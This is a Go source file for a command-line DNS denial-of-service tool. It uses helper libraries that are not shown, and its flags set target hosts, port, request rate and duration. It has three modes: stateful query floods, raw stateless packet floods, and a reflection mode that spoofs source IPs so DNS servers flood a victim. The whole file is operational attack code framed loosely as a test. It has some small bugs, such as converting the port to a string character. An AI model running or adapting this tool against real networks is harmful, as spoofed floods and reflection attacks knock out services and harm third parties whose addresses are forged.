package main

import (
	"flag"
	"log"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"lib/channels/chanman"
	"lib/config"
	"lib/protocols/dnsproto"
	"lib/protocols/dnsproto/dnsraw"
	//"code.google.com/p/go.net/ipv4"
)

var protoFlag = flag.String("p", "dns", "Specify protocol to use for DoS (dns)") //specify which protocol to use, only dns for now
var destPort = flag.Uint("P", 53, "Specify destination port for DoS")            //specify the destinaton port to use, 53 is the default
var destIPs = flag.String("d", "127.0.0.1", "Specify an single host or a list of destination hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5)")
var srcIPs = flag.String("s", "127.0.0.1", "Specify an single host or a list of source hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5), only used for reflection attacks")
var rateFlag = flag.Uint("r", 1, "Specify the amount of protocol requests per second")
var durationFlag = flag.Uint("D", 60, "Specify the total duration of the test")
var interfaceFlag = flag.String("i", "eth0", "Specify which interface name to eject packets from (raw packets only)")
var floodFlag = flag.Bool("F", false, "Specifies if the dns request should be flooded statelessly")
var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from. In this case the source IPs are destination IPs and the destination is the source.")

func main() {
	//Set the runtime to the max number of available CPUs
	runtime.GOMAXPROCS(runtime.NumCPU())

	//inialize the comminications channels for managing goroutines
	cm := chanman.NewChanMan()

	//initalize a config
	cfg := config.NewConfig()

	//initailize the wait group used to manage the threads
	wg := new(sync.WaitGroup)

	//initialize the counters for our statistcs
	var runCounter uint
	runCounter = 0
	var queryCounter int
	queryCounter = 0

	//parse the command line options
	flag.Parse()
	//check the provided options
	if *protoFlag == "dns" {
		cfg.SetProtocol("dns")
	} else {
		log.Fatalf("The specified protocol %s is not supported", protoFlag)
	}

	if destPort != nil && *destPort < 65536 && *destPort > 1 {
		cfg.SetDstPort(uint16(*destPort)) //cast to uint16
	} else {
		log.Fatalf("The defiened destination port %d is outside of the accepted range\n", destPort)
	}

	if destIPs != nil {
		//process dest IPs to string array
		cfg.SetDstIPsByString(*destIPs)
	} else {
		log.Fatalf("Error in parsing the specified destination IPs %s\n", destIPs)
	}

	if srcIPs != nil {
		//process dest IPs to string array
		cfg.SetSrcIPsByString(*srcIPs)
	} else {
		log.Fatalf("Error in parsing the specified souce IPs %s\n", destIPs)
	}

	if *rateFlag > 0 {
		cfg.SetRate(uint(*rateFlag))
	} else {
		log.Fatalf("The specified rate %d is not within an acceptable range\n", rateFlag)
	}

	if *durationFlag > 0 {
		cfg.SetDuration(uint(*durationFlag))
	} else {
		log.Fatalf("The specified duration %d is not within an acceptable range\n", durationFlag)
	}

	if interfaceFlag != nil {
		//take interface string and specify the correct index
		cfg.SetInterfaceByName(*interfaceFlag)
	} else {
		log.Fatalf("The egress interface was not specified")
	}

	//configure startup for test

	log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s", *destIPs, *destPort, *protoFlag, *rateFlag)

	ticker := time.NewTicker(time.Second * 1)

	//Intialize goroutine to collect stats
	go func() {
		for {
			select {
			case val := <-cm.RunChan:
				if val == true {
					queryCounter = queryCounter + 1
				} else if val == false {
					log.Println("FALSE")
					return
				}
			case val := <-cm.StatsChan:
				//aggregate stats
				log.Println(*val)
			}
		}
	}()

	//types stateful, flood, reflection
	if *floodFlag != true && *reflectionFlag != true {
		//start a stateful request flow
		// A stateful request is initiated by the client running the tool
		config := new(dns.ClientConfig)
		config.Servers = strings.Split(*destIPs, ":")
		config.Port = string(*destPort)
		config.Ndots = 1
		config.Timeout = 1
		config.Attempts = 1
		for t := range ticker.C {
			log.Println(t)
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				go dnsproto.DnsQuery(wg, config, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *floodFlag && *reflectionFlag != true {
		for t := range ticker.C {
			log.Println(t)
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				//send flood packet
				rawQuery := dnsraw.NewRawDNS()
				rawQuery.SetLocalAddress(cfg.SrcIPs[0])
				rawQuery.SetRemoteAddress(cfg.DstIPs[0])
				rawQuery.SetDestPort(cfg.DstPort)
				go rawQuery.DnsQuery(wg, cfg.Interface.Index, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *reflectionFlag && *floodFlag != true {
		//reflect off of destination hosts from source IPs
		for t := range ticker.C {
			log.Println(t)
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				//send flood packet
				rawQuery := dnsraw.NewRawDNS()
				rawQuery.SetLocalAddress(cfg.DstIPs[0])
				rawQuery.SetRemoteAddress(cfg.SrcIPs[0])
				rawQuery.SetDestPort(cfg.DstPort)
				go rawQuery.DnsQuery(wg, cfg.Interface.Index, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *reflectionFlag && *floodFlag {
		//not a valid state
		log.Fatalln("The selection of reflection and flood flags is invalid. Please choose a supported combination.")
	} else {
		//no state decided
		log.Fatalln("Please choose a supported combinatio of operational flags.")
	}

}
